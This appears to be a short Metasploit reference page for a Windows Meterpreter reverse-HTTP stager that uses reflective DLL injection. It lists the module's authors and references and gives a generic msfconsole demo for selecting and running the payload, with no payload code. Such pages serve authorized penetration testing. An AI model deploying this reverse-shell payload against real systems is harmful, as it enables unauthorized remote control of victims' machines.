## Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (winhttp)

Inject the meterpreter server DLL via the Reflective Dll 
Injection payload (staged). Tunnel communication over HTTP 
(Windows winhttp)


## Module Name
payload/windows/meterpreter/reverse_winhttp

## Authors
* skape
* sf
* OJ Reeves
* hdm
* Borja Merino <bmerinofe[at]gmail.com>


## References
* https://github.com/stephenfewer/ReflectiveDLLInjection
* https://github.com/rapid7/ReflectiveDLLInjection




## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/meterpreter/reverse_winhttp
msf payload(reverse_winhttp) > show targets
   ... a list of targets ...
msf payload(reverse_winhttp) > set TARGET <target-id>
msf payload(reverse_winhttp) > show options
   ... show and set options ...
msf payload(reverse_winhttp) > run
```
    
    